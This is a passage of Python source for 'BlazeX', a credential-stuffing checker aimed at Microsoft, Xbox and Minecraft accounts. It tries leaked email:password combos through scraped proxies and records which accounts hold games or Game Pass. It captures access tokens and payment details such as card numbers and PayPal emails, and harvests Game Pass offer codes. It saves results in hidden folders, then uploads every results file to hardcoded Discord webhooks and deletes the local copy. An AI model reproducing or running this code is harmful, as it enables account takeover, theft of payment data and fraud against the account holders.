                        sub_data['recurring'] = lr_parse(r.text, 'recurringFrequency":"', '"')
                        sub_data['title'] = lr_parse(r.text, f'"subscriptionId":"mdr:{sub_data["id"]}","autoRenew":{sub_data["auto_renew"]},"startDate":"{sub_data["start_date"]}","recurringFrequency":"{sub_data["recurring"]}","nextRenewalDate":"{sub_data["next_renewal"]}","title":"', '"')
                    else:
                        sub_data['title'] = lr_parse(r.text, '"title":"', '"')
                    parts = [f"Purchased Item: {sub_data['title']}"] if sub_data['title'] else []
                    if sub_data['auto_renew']:
                        parts.append(f"Auto Renew: {sub_data['auto_renew']}")
                    if sub_data['start_date']:
                        parts.append(f"startDate: {sub_data['start_date']}")
                    if sub_data['next_renewal']:
                        parts.append(f"Next Billing: {sub_data['next_renewal']}")
                    if prefix == 'mdr' and sub_data['recurring']:
                        parts.append(f"Recurring: {sub_data['recurring']}")
                    if parts:
                        subscriptions.append(f"[ {' | '.join(parts)} ]")
            product_info = {}
            for key, start, end in [
                ('description', '"description":"', '"'),
                ('product_type', '"productType":"', '"'),
                ('quantity', 'quantity":', ','),
                ('currency', 'currency":"', '"'),
                ('total_amount', 'totalAmount":', '')
            ]:
                product_info[key] = lr_parse(r.text, start, end, create_empty=key != 'total_amount')
            product_type_map = {"PASS": "XBOX GAME PASS", "GOLD": "XBOX GOLD"}
            product_info['product_type'] = product_type_map.get(product_info['product_type'], product_info['product_type'])
            total_amount = f"{product_info['total_amount']} {product_info['currency']}" if product_info['total_amount'] else f"0 {product_info['currency']}"
            product_parts = [f"Product: {product_info['description']}"] if product_info['description'] else []
            if product_info['product_type']:
                product_parts.append(f"Product Type: {product_info['product_type']}")
            if product_info['quantity']:
                product_parts.append(f"Total Purchase: {product_info['quantity']}")
            product_parts.append(f"Total Price: {total_amount}")
            if product_parts:
                subscriptions.append(f"[ {' | '.join(product_parts)} ]")
            payment = paymentprint = ""
            for key, label in [
                ('date_registered', "Date Registered"),
                ('fullname', "Fullname"),
                ('user_address', "User Address", user_address),
                ('paypal_email', "Paypal Email"),
                ('credit_card', "CC Info", f"{payment_data['credit_card']} ending in {payment_data['last4']} expires {payment_data['expiry_month']}/{payment_data['expiry_year']}" if payment_data['credit_card'] else None),
                ('balance', "Balance")
            ]:
                value = locals().get(key, payment_data.get(key))
                if value:
                    payment += f"\n{label}: {value}"
                    paymentprint += f" | {label}: {value}"
            for sub in subscriptions:
                payment += f"\n{sub}"
                paymentprint += f" | {sub}"
            payment += "\n============================\n"
            if screen == "'2'":
                print(Fore.LIGHTBLUE_EX + f"Payment: {email}:{password}" + paymentprint)
            with open(os.path.join(results_dir, "Payment.txt"), 'a', encoding='utf-8') as file:
                file.write(f"{email}:{password}" + payment)
            break
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(1)

def validmail(email, password):
    global vm, cpm, checked
    vm += 1
    cpm += 1
    checked += 1
    with open(os.path.join(results_dir, "Valid_Mail.txt"), 'a') as file:
        file.write(f"{email}:{password}\n")
    if screen == "'2'":
        print(Fore.LIGHTMAGENTA_EX + f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=10)
            if r.status_code == 200:
                data = r.json()
                capes = ", ".join(cape["alias"] for cape in data.get("capes", []))
                CAPTURE = Capture(email, password, data['name'], capes, data['id'], access_token, type, session)
                CAPTURE.handle(session)
                break
            elif r.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                time.sleep(20 if len(proxylist) < 5 else 1)
            else:
                break
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(1)

def checkmc(session, email, password, token, xbox_token):
    global retries, cpm, checked, xgp, xgpu, other
    while True:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
            if checkrq.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                time.sleep(20 if not proxylist else 1)
            else:
                break
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(1)
    if checkrq.status_code == 200:
        codes = []
        if 'product_game_pass_ultimate' in checkrq.text:
            xgpu += 1
            cpm += 1
            checked += 1
            if screen == "'2'":
                print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {email}:{password}")
            with open(os.path.join(results_dir, "XboxGamePassUltimate.txt"), 'a') as f:
                f.write(f"{email}:{password}\n")
            process_game_pass(session, email, password, xbox_token, codes, "XboxGamePassUltimate")
            capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
            return True
        elif 'product_game_pass_pc' in checkrq.text:
            xgp += 1
            cpm += 1
            checked += 1
            if screen == "'2'":
                print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {email}:{password}")
            with open(os.path.join(results_dir, "XboxGamePass.txt"), 'a') as f:
                f.write(f"{email}:{password}\n")
            process_game_pass(session, email, password, xbox_token, codes, "XboxGamePass")
            capture_mc(token, session, email, password, "Xbox Game Pass")
            return True
        elif '"product_minecraft"' in checkrq.text:
            checked += 1
            cpm += 1
            with open(os.path.join(results_dir, "Normal.txt"), 'a') as f:
                f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, "Normal")
            return True
        else:
            others = []
            for product, label in [('product_minecraft_bedrock', "Minecraft Bedrock"), ('product_legends', "Minecraft Legends"), ('product_dungeons', "Minecraft Dungeons")]:
                if product in checkrq.text:
                    others.append(label)
            if others:
                other += 1
                cpm += 1
                checked += 1
                items = ', '.join(others)
                with open(os.path.join(results_dir, "Other.txt"), 'a') as f:
                    f.write(f"{email}:{password} | {items}\n")
                if screen == "'2'":
                    print(Fore.YELLOW + f"Other: {email}:{password} | {items}")
                return True
            return False
    return False

def process_game_pass(session, email, password, xbox_token, codes, file_prefix):
    global retries
    try:
        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json'}, timeout=15).json()
        uhss = xsts['DisplayClaims']['xui'][0]['uhs']
        xsts_token = xsts['Token']
        headers = {
            "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0"
        }
        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers, timeout=10)
        if 'offerid' in r.text.lower():
            offers = r.json()["offers"]
            current_time = datetime.now(timezone.utc)
            valid_offer_ids = [offer["offerId"] for offer in offers if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
            with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                for offer in valid_offer_ids:
                    f.write(f"{offer}\n")
            codes.extend(offer['offerId'] for offer in offers)
            if len(offers) < 5:
                generate_offers(session, headers, codes)
        else:
            generate_offers(session, headers, codes)
    except Exception as e:
        retries += 1
        print(Fore.YELLOW + f"Game pass processing failed: {e}")

def generate_offers(session, headers, codes):
    global retries
    while True:
        try:
            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=10)
            if 'offerId' in r.text:
                offers = r.json()["offers"]
                current_time = datetime.now(timezone.utc)
                valid_offer_ids = [offer["offerId"] for offer in offers if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                    for offer in valid_offer_ids:
                        f.write(f"{offer}\n")
                should_continue = any(offer['offerId'] not in codes for offer in offers)
                codes.extend(offer['offerId'] for offer in offers)
                if not should_continue:
                    break
            else:
                break
        except:
            retries += 1
            time.sleep(1)

def mc_token(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                time.sleep(20 if not proxylist else 1)
            else:
                return mc_login.json().get('access_token')
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(1)

def authenticate(email, password, tries=0):
    global retries, bad, checked, cpm
    session = requests.Session()
    session.verify = False
    session.proxies = getproxy()
    try:
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token:
                            hit = checkmc(session, email, password, access_token, xbox_token)
            except Exception as e:
                print(Fore.YELLOW + f"Authentication error: {e}")
            if not hit:
                validmail(email, password)
            if config.get('payment'):
                payment(session, email, password)
    except Exception as e:
        if tries < maxretries:
            retries += 1
            authenticate(email, password, tries + 1)
        else:
            bad += 1
            checked += 1
            cpm += 1
            if screen == "'2'":
                print(Fore.RED + f"Bad: {email}:{password}")
            with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
                f.write(f"{email}:{password}\n")
    finally:
        session.close()

def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if not filename:
        print(Fore.LIGHTRED_EX + "Invalid File.")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX + f"[{len(lines) - len(Combos)}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX + f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(2)
            Load()

def JOB():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if not fileNameProxy:
        print(Fore.LIGHTRED_EX + "Invalid File.")
        time.sleep(2)
        JOB()
    else:
        try:
            with open(fileNameProxy.name, 'r', encoding='utf-8', errors='ignore') as e:
                proxylist = [line.split()[0].strip() for line in e.readlines() if line.strip()]
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(2)
            JOB()

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"BlazeX by HarshOGG| Checked: {checked}/{len(Combos)} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - Xbox Game Pass: {xgp} - Xbox Game Pass Ultimate: {xgpu} - Valid Mail: {vm} - Other: {other} - Cpm: {cmp1*60} - Retries: {retries} - Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen, daemon=True).start()

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(Fore.CYAN + logo)
    for stat, value in [
        ("Checked", f"{checked}/{len(Combos)}"),
        ("Hits", hits), ("Bad", bad), ("SFA", sfa), ("MFA", mfa),
        ("2FA", twofa), ("Xbox Game Pass", xgp), ("Xbox Game Pass Ultimate", xgpu),
        ("Other", other), ("Valid Mail", vm), ("Retries", retries), ("Errors", errors)
    ]:
        print(Fore.CYAN + f" [{value}] {stat}")
    utils.set_title(f"BlazeX by HarshOGG| Checked: {checked}/{len(Combos)} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - Xbox Game Pass: {xgp} - Xbox Game Pass Ultimate: {xgpu} - Valid Mail: {vm} - Other: {other} - Cpm: {cmp1*60} - Retries: {retries} - Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen, daemon=True).start()

def hide_folder(path):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)

def finishedscreen():
    global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname, results_dir, temp_dir
    file_webhooks = {
        "Hits.txt": "https://discord.com/api/webhooks/1390944578713944198/Ffxe2lTw4QABHRN0dWN6krZkP6r-3BoZjpPDh-mvo0ac8vIvaXZWldRICCSFLG-pdfcU",
        "SFA.txt": "https://discord.com/api/webhooks/1398537934705266688/dYYYO7P9AIXD8C5L6UOR7Wq_6wbUHB43wp6dA1mEmHdkoLppEfTD59Iu_mZinrNJvLOU",
        "MFA.txt": "https://discord.com/api/webhooks/1398538914649866373/ccYD3ctSjYGLcFATGk9Xv3w4nVEUdd4CSxEHr3p6R8IMKGuDcP-9M2uwWhUXZQu9zNx5",
        "Normal.txt": "https://discord.com/api/webhooks/1390944609424773130/FsF2dw1IouR9FqxsH8ZbAtu66prQ5F0aVXv3S43C57-eVJS2lXgjwE1x0Rzf-lPuR15t",
        "XboxGamePass.txt": "https://discord.com/api/webhooks/1390944611991552122/O9dqI3hLGNx7bj3uZzotibFSTu3KtMqP-GPXRX31KdvU_TeGOSZ3W0ntXtyTafW6ZLdO",
        "XboxGamePassUltimate.txt": "https://discord.com/api/webhooks/1390944614327914586/PdRRtgo3oQrF_3uF8YOC5V3SKHh2Y5_M_-96c4t5dLIQH1uQwJuJPqSWygLJhx6oxx6L",
        "Other.txt": "https://discord.com/api/webhooks/1390944616454291528/059yo-415DUPgFHAnAlbVkVJNFp2mFxaaPxkAJAkuelhol5s-cSen3477d_OvKqnn-l1",
        "Valid_Mail.txt": "https://discord.com/api/webhooks/1390944617763045506/_a_QCm-iXGdxhsdrrlA5Wy4ZKjeN6o-SJO3hq-ExIIqDGuKJ5qcItcjOKztXBxFS7XbK",
        "Banned.txt": "https://discord.com/api/webhooks/1390944618664955966/2T3cnci0K9HIVAtRZ3_MIMh-aVbNx5zQbXh06UsUu_VmtXyZVyGKRBh-kivfwqzY15sD",
        "Unbanned.txt": "https://discord.com/api/webhooks/1390944619105353758/ZN1FK9t95ta6wC8hLO_aKGBq2IJJjWnzoUJc8iigWSQbvL8cKO6scxfy-Xbr_bRb40G3",
        "rank.txt": "https://discord.com/api/webhooks/1390944619889561630/ZdnCQmdiF_xqTAgdrbJ5xKPXHtRAEG3MTU2uhbzrzWxQafeSEbJaf88YCUYTZUc_HiUn",
        "name_changable.txt": "https://discord.com/api/webhooks/1390944620468375615/fzbLfKQmccJsi4eEaTVHuhVrtPTcQaUxv-rXYWx8ywn6hrvgMprVMaT6XClwXbiDrwvQ",
        "capes.txt": "https://discord.com/api/webhooks/1390944621349179465/oR0eC3-AWlCBq47Ki7BFaiWPgMC5-yOqJ7dpYsd5WSwqDBGWX4oECnawwf2-LMpIyXEg",
        "Capture.txt": "https://discord.com/api/webhooks/1398539905860243478/WeYQrf-JTXcCYVjJKOwwEsx0Brn-OBqASJB8LWMJLmVbsfWhDuCYLUpSZeUN_dtBO6TY",
        "Payment.txt": "https://discord.com/api/webhooks/1398540023321727038/OkJJCVhSmvhX5jhLpDHqtXz75VcnXSzdkLswapUmWnEq6Rtpzwp-oJ2ng3tNnGTX3nWT",
        "Codes.txt": "https://discord.com/api/webhooks/1390947924115984525/fyE44VD5GFiwxyuQLf6lP6mTyhYfNiM8SQb6HYU4FpPey_8uzo7V4lDsKngK-zAG7Tcm",
    }
    folder_webhooks = {
        "Capes": "https://discord.com/api/webhooks/1398553856501350440/Se18hLbyV5Ib8VwjWIDvLoV-Raq11djtNWGNutmNazNmFotJACJy9MY6rNXN6do2b1i4",
        "Cookies": "https://discord.com/api/webhooks/1398553987661430855/XPZe32V0hSgHDOQQPSYUbsdez-zVzQar9LYwZ7CFwCdnoJ0CoWVgtYj3i9xKr48KNB-e"
    }
    completion_webhook = "https://discord.com/api/webhooks/1390949129336651837/glqNcQWW63qoDPqwX8FhjvxprQO1-zmfm2t7JA3-6xhetq_66GU3q1QVHQFRUQqO0C9n"
    default_file_webhook = "https://discord.com/api/webhooks/1390948682106671145/_x1tLmFeHaSKAaFHpSdoxQwbuzTv8ZheIMBsyCtwnRTowgpobYlUkoojaK38_JXPQIGt"

    print(logo)
    print(Fore.LIGHTGREEN_EX + "\nFinished Checking!\n")
    for stat, value in [
        ("Hits", hits), ("Bad", bad), ("SFA", sfa), ("MFA", mfa),
        ("2FA", twofa), ("Xbox Game Pass", xgp), ("Xbox Game Pass Ultimate", xgpu),
        ("Other", other), ("Valid Mail", vm)
    ]:
        print(f"{stat}: {value}")

    if default_file_webhook:
        counts = {}
        files_to_count = ["Hits.txt", "Bad.txt", "2fa.txt", "SFA.txt", "MFA.txt", "XboxGamePass.txt", "XboxGamePassUltimate.txt", "Other.txt", "Valid_Mail.txt", "Banned.txt", "Unbanned.txt", "rank.txt", "name_changable.txt"]
        for file in files_to_count:
            try:
                with open(os.path.join(results_dir, file), 'r') as f:
                    counts[file] = len(f.readlines())
            except FileNotFoundError:
                counts[file] = 0
        capes_count = sum(len(open(os.path.join(results_dir, "Capes", file), 'r').readlines()) for file in os.listdir(os.path.join(results_dir, "Capes")) if file.endswith(".txt")) if os.path.exists(os.path.join(results_dir, "Capes")) else 0
        embed_fields = [
            {"name": name, "value": str(counts.get(file, 0) if file else capes_count), "inline": True}
            for name, file in [
                ("🎯 Hits", "Hits.txt"), ("❌ Bad", "Bad.txt"), ("🔒 2FA", "2fa.txt"), ("🔓 SFA", "SFA.txt"), ("🔐 MFA", "MFA.txt"),
                ("🎮 Xbox Game Pass", "XboxGamePass.txt"), ("🏆 Xbox Game Pass Ultimate", "XboxGamePassUltimate.txt"),
                ("🔄 Other", "Other.txt"), ("📧 Valid Mail", "Valid_Mail.txt"), ("⛔ Banned", "Banned.txt"),
                ("✅ Unbanned", "Unbanned.txt"), ("🏅 Ranked", "rank.txt"), ("🔄 Name Changable", "name_changable.txt"),
                ("🦸 Capes", None)
            ]
        ]
        payload = {
            "username": "🉑・ BlazeCloud - The Best Cloud!",
            "avatar_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp",
            "embeds": [{
                "author": {"name": "📈・ BlazeCloud Minecraft Checker Summary", "url": "https://discord.gg/blazexcloud", "icon_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp"},
                "title": "Checker Results Summary",
                "color": 3821605,
                "fields": embed_fields,
                "footer": {"text": f"🪐・ Summary By .gg/blazecloud - Checked by {RESTOCKER_NAME}", "icon_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp"}
            }]
        }
        try:
            requests.post(default_file_webhook, json=payload, timeout=10)
        except:
            pass
        for root, _, files in os.walk(results_dir):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    relative_path = os.path.relpath(root, results_dir)
                    message = f"File uploaded successfully 📤 checked by {RESTOCKER_NAME} - {file}" if relative_path == "." else f"File uploaded successfully from {relative_path} 📤 checked by {RESTOCKER_NAME} - {file}"
                    for webhook in [default_file_webhook, file_webhooks.get(file, default_file_webhook) if relative_path == "." else folder_webhooks.get(relative_path.split(os.sep)[0], default_file_webhook)]:
                        try:
                            with open(file_path, 'rb') as f:
                                requests.post(webhook, data={"content": message}, files={'file': (file, f)}, timeout=30)
                        except:
                            pass
        try:
            requests.post(completion_webhook, json={"content": f"File checking completed by {RESTOCKER_NAME} ✅"}, timeout=10)
        except:
            pass
    else:
        print(Fore.YELLOW + "Default file webhook not set. Skipping upload.")
    try:
        shutil.rmtree(temp_dir)
        print(Fore.CYAN + "Temporary directory cleaned up.")
    except Exception as e:
        print(Fore.YELLOW + f"Warning: Failed to delete temporary directory: {e}")
    print(Fore.LIGHTRED_EX + "Press any key to exit.")
    readchar.readkey()

def getproxy():
    if proxytype == "'5'":
        return random.choice(proxylist) if proxylist else None
    if proxytype != "'4'" and proxylist:
        proxy = random.choice(proxylist)
        return {
            "'1'": {'http': f'http://{proxy}', 'https': f'http://{proxy}'},
            "'2'": {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'},
            "'3'": {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
        }.get(proxytype, None)
    return None

def Checker(combo):
    global bad, checked, cpm
    try:
        decoded_combo = decode_combo(combo.strip())
        if not decoded_combo:
            raise ValueError("Decoding failed")
        email, password = decoded_combo.split(":", 1)
        if email and password:
            authenticate(email, password)
        else:
            raise ValueError("Empty email or password")
    except Exception as e:
        print(Fore.YELLOW + f"Checker error for {combo.strip()}: {e}")
        bad += 1
        cpm += 1
        checked += 1
        if screen == "'2'":
            print(Fore.RED + f"Bad: {combo.strip()}")
        with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
            f.write(f"{combo.strip()}\n")

def get_proxies():
    global proxylist
    http, socks4, socks5 = [], [], []
    apis = {
        'http': ["https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text", "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"],
        'socks4': ["https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text", "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"],
        'socks5': ["https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"]
    }
    for proto, urls in apis.items():
        for url in urls:
            try:
                (http if proto == 'http' else socks4 if proto == 'socks4' else socks5).extend(requests.get(url, timeout=10).text.splitlines())
            except:
                pass
    for proto, url in [('socks4', "https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500"), ('socks5', "https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500")]:
        try:
            for dta in requests.get(url, timeout=10).json().get('data', []):
                (socks4 if proto == 'socks4' else socks5).append(f"{dta.get('ip')}:{dta.get('port')}")
        except:
            pass
    proxylist = list(set(http + socks4 + socks5))
    if screen == "'2'":
        print(Fore.LIGHTBLUE_EX + f'Scraped [{len(proxylist)}] proxies')
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def banproxyload():
    global banproxies
    proxyfile = filedialog.askopenfile(mode='rb', title='Choose a SOCKS5 Proxy file', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if not proxyfile:
        print(Fore.LIGHTRED_EX + "Invalid File.")
        time.sleep(2)
        banproxyload()
    else:
        try:
            with open(proxyfile.name, 'r', encoding='utf-8', errors='ignore') as e:
                banproxies = [line.split()[0].strip() for line in e.readlines() if line.strip()]
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(banproxies)}] lines.")
            time.sleep(2)
        except:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(2)
            banproxyload()

def Main():
    global proxytype, screen, results_dir, temp_dir
    check_passkey()
    check_for_updates()
    utils.set_title("BlazeX by HarshOGG and SteveOG")
    os.system('cls')
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX + "Use max 10 threads")
        thread = int(input(Fore.LIGHTBLUE_EX + "Threads: "))
        if thread > 10:
            thread = 10
    except:
        print(Fore.LIGHTRED_EX + "Must be a number.")
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX + "Proxy Type: [1] Http/s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype = repr(readchar.readkey())
    if proxytype not in ["'1'", "'2'", "'3'", "'4'", "'5'"]:
        print(Fore.RED + f"Invalid Proxy Type {proxytype}")
        time.sleep(2)
        Main()
    screen = "'2'" if config.get('log') else "'1'"
    print(Fore.LIGHTBLUE_EX + "Select your combos")
    Load()
    if proxytype not in ["'4'", "'5'"]:
        print(Fore.LIGHTBLUE_EX + "Select your proxies")
        JOB()
    if not config.get('proxylessban') and config.get('hypixelban'):
        print(Fore.LIGHTBLUE_EX + "Select your SOCKS5 Ban Checking Proxies.")
        banproxyload()
    if proxytype == "'5'":
        print(Fore.LIGHTGREEN_EX + "Scraping Proxies Please Wait.")
        proxy_thread = threading.Thread(target=get_proxies, daemon=True)
        proxy_thread.start()
        while not proxylist:
            time.sleep(1)
    temp_dir = tempfile.mkdtemp()
    hide_folder(temp_dir)
    results_dir = os.path.join(temp_dir, fname)
    os.makedirs(results_dir)
    hide_folder(results_dir)
    (cuiscreen if screen == "'1'" else logscreen)()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()

if __name__ == "__main__":
    Main()
